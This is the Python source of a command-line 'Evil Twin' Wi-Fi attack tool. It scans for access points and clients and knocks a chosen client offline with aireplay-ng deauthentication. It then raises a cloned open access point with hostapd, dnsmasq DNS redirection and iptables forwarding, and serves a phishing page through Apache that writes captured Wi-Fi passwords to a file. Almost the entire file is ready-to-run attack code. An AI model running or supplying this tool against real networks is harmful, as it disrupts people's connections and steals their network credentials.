# Evil - Twin WPA attack CLI tool
from scapy.all import *
import time
import os
from threading import Thread
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt

ap_list = []
ap_to_attack = None
clients = []
client_to_attack = None
done_scanning = False

def bash(cmd):
    return os.popen(cmd).read()


def enable_monitor_mode(interface):
    bash(f"ip link set {interface} down")
    time.sleep(1)
    # use iw to set interface to monitor mode
    bash(f"iw {interface} set monitor none")
    bash(f"ip link set {interface} up")
    time.sleep(1)


def disable_monitor_mode(interface):
    bash(f"ip link set {interface} down")
    time.sleep(1)
    # use iw to set interface to managed mode
    bash(f"iw {interface} set type managed")
    bash(f"ip link set {interface} up")
    time.sleep(1)


def change_channel(interface):
    global done_scanning
    ch = 1
    while True and not done_scanning:
        # change channel
        bash(f"iw {interface} set channel {ch}")
        # switch channel from 1 to 14 each 1s
        ch = ch % 14 + 1
        time.sleep(1)


def callback_ap(pkt):
    # identify a new access point and add it to the list
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr2
        ssid = pkt[Dot11Elt].info.decode()
        signal_strength = pkt.dBm_AntSignal
        if bssid not in [ap[0] for ap in ap_list]:
            ap_list.append((bssid, ssid))
            print(f"\t[+] Found new access point: {bssid} {ssid}\tSignal strength: {signal_strength}")


def callback_client(pkt):
    #  get all clients associated with access point
    global clients
    if pkt.haslayer(Dot11):
        if pkt.addr1 and pkt.addr2:
            if ap_to_attack[0] == pkt.addr1:
                if pkt.type in [1, 2]:  # the type I'm looking for
                    if pkt.addr2 not in clients and pkt.addr2 != '':
                        clients.append(pkt.addr2)

    if (pkt.addr2 == ap_to_attack[0] or pkt.addr3 == ap_to_attack[0]) and pkt.addr1 != "ff:ff:ff:ff:ff:ff":
        if pkt.addr1 not in clients and pkt.addr2 != pkt.addr1 and pkt.addr1 != pkt.addr3 and pkt.addr1:
            clients.append(pkt.addr1)
            print(f"\t[+] Found new client: {pkt.addr1}")


def killall():
    #  kill all attack processes
    bash("killall hostapd")
    bash("killall dnsmasq")
    bash("service NetworkManager restart")
    bash("service wpa_supplicant restart")
    bash("echo 0 > /proc/sys/net/ipv4/ip_forward")
    bash("iptables --flush")
    bash("iptables --flush --table nat")
    bash("iptables --delete-chain")
    bash("iptables --table nat --delete-chain")
    bash("systemctl stop apache2")


class EvilTwin:
    def __init__(self, iface):
        self.interface = iface

    def scan_for_aps(self):
        #  scan for nearby access points for 60 seconds
        channel_changer = Thread(target=change_channel, args=(self.interface,))
        channel_changer.start()
        sniff(prn=callback_ap, iface=self.interface, timeout=60)
        global done_scanning
        done_scanning = True

    def setup_hostapd_conf(self):
        #  set up hostapd.conf for an open network
        print("[*] Setting up hostapd.conf for an open network")
        with open("/etc/hostapd/hostapd.conf", "w") as f:
            f.write("interface=%s\n" % self.interface)
            f.write("ssid=%s\n" % ap_to_attack[1])
            f.write("driver=nl80211\n")
            f.write("hw_mode=g\n")
            f.write("channel=1\n")
            f.write("ieee80211n=1\n")
            f.write("macaddr_acl=0\n")
            f.write("auth_algs=1\n")

    def setup_dnsmasq_conf(self):
        #  set up dnsmasq.conf for DHCP server
        print("[*] Setting up dnsmasq.conf for DHCP server")
        with open("/etc/dnsmasq.conf", "w") as f:
            f.write("no-resolv\n")
            f.write("interface=%s\n" % self.interface)
            f.write("dhcp-range=192.168.1.2,192.168.1.150,12h\n")
            f.write("dhcp-option=3,192.168.1.1\n")  # gw
            f.write("dhcp-option=6,192.168.1.1\n")  # dns
            f.write(f"address=/#/192.168.1.1\n")
            f.write("server=8.8.8.8\n")

    def setup_iptables(self):
        #  set up iptables for access point
        bash("iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
        bash(f"iptables -A FORWARD -i {self.interface} -o eth0 -j ACCEPT")
        bash("sysctl net.ipv4.ip_forward=1")

    def setup_ap(self):
        #  set up access point for client to connect to using hostapd
        print("[*] Setting up access point for client to connect to")
        #  set up hostapd.conf
        self.setup_hostapd_conf()
        bash(f"hostapd -B /etc/hostapd/hostapd.conf &")
        #  set up dnsmasq.conf
        bash(f"ifconfig {self.interface} up 192.168.1.1/24 netmask 255.255.255.0")
        bash("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")
        print("[*] Setting up dhcp server")
        self.setup_dnsmasq_conf()
        bash(f"dnsmasq -C /etc/dnsmasq.conf")
        #  set up iptables
        print("[*] Setting up iptables")
        self.setup_iptables()
        print("[*] Access point is up and ready")

    def setup_apache_server(self):
        #  set up apache2 configuration
        print("[*] Setting up apache2 configuration")
        with open("/etc/apache2/sites-enabled/000-default.conf", "w") as f:
            f.write("<VirtualHost *:80>\n")
            f.write("\tServerAdmin webmaster@localhost\n")
            f.write("\tDocumentRoot /var/www/html\n")
            f.write("\tErrorLog ${APACHE_LOG_DIR}/error.log\n")
            f.write("\tCustomLog ${APACHE_LOG_DIR}/access.log combined\n")
            f.write("</VirtualHost>\n")
            f.write('<Directory "/var/www/html">\n')
            f.write("\tRewriteEngine On\n")
            f.write("\tRewriteBase /\n")
            f.write("\tRewriteCond %{HTTP_HOST} ^www\\.(.*)$ [NC]\n")
            f.write("\tRewriteRule ^(.*)$ http://%1/$1 [R=301,L]\n")
            f.write("\n\tRewriteCond %{REQUEST_FILENAME} !-f\n")
            f.write("\tRewriteCond %{REQUEST_FILENAME} !-d\n")
            f.write("\tRewriteRule ^(.*)$ / [L,QSA]\n")
            f.write("</Directory>\n")
        #  set up apache server
        bash("cp -r `pwd`/website/* /var/www/html/")
        bash("touch /home/kali/Desktop/password.txt")
        bash("chmod 777 /home/kali/Desktop/password.txt")
        bash("a2enmod rewrite && service apache2 start")

    def de_auth_client(self, t):
        """
        aireplay is a tool that deauthenticates clients from an access point
        use aireplay-ng to deauth clients for t seconds
        """
        bash(f"aireplay-ng -0 {t} -a {ap_to_attack[0]} -c {client_to_attack} {self.interface}")

    def start_evil_twin(self):
        global ap_list, clients, ap_to_attack, client_to_attack
        #  enable monitor mode
        print("[*] Enabling monitor mode")
        enable_monitor_mode(self.interface)
        time.sleep(1)
        #  scan for nearby access points
        print("[*] Scanning for nearby access points")
        self.scan_for_aps()
        print(f"[*] Found {len(ap_list)} access points")

        #  prompt user for access point to attack
        print("[*] Please choose an access point to attack")
        for ap, i in zip(ap_list, range(len(ap_list))):
            print(f"\t[{i + 1}] {ap[0]} {ap[1]}")

        while True:
            i = int(input("[>] "))
            if i not in range(1, len(ap_list) + 1):
                print("[!] Please enter a valid access point")
            else:
                ap_to_attack = ap_list[i - 1]
                break

        #  get all clients of access point and prompt user for client to attack
        print("[*] Getting all clients of access point")
        sniff(iface=self.interface, prn=callback_client, timeout=10)
        clients.append("00:00:00:00:00:00")
        print(f"[*] Found {len(clients)} clients")
        print("[*] Please choose a client to attack")
        for client, i in zip(clients, range(len(clients))):
            print(f"\t[{i + 1}] {client}")

        while True:
            i = int(input("[>] "))
            if i not in range(1, len(clients) + 1):
                print("[!] Please enter a valid client")
            else:
                client_to_attack = clients[i - 1]
                break

        # deauth for 10 seconds
        print("[*] Starting deauth attack for 10 seconds")
        disable_monitor_mode(self.interface)
        time.sleep(1)
        self.de_auth_client(10)

        #  set up access point for client to connect to
        self.setup_ap()

        #  start apache server
        print("[*] Starting apache server")
        self.setup_apache_server()

        # enter p to print collected password or q to exit
        while True:
            c = input("enter p to print collected password or q to exit: ")
            if c == "p":
                print(open("/home/kali/Desktop/password.txt", 'r').read())
            elif c == "q":
                break

        killall()


def main():
    #  print welcome message
    print("[*] Welcome to Evil Twin WPA attack CLI tool")
    #  prompt user for interface
    print("[?] Enter the interface you want to use: ")
    for interface, i in zip(get_if_list(), range(len(get_if_list()))):
        print(f"\t[{i + 1}] {interface}")
    interface = ""
    while True:
        i = int(input("[>] "))
        if i not in range(1, len(get_if_list()) + 1):
            print("[!] Please enter a valid interface")
        else:
            interface = get_if_list()[i - 1]
            break
    #  start evil twin attack
    e = EvilTwin(interface)
    e.start_evil_twin()


if __name__ == "__main__":
    killall()
    main()
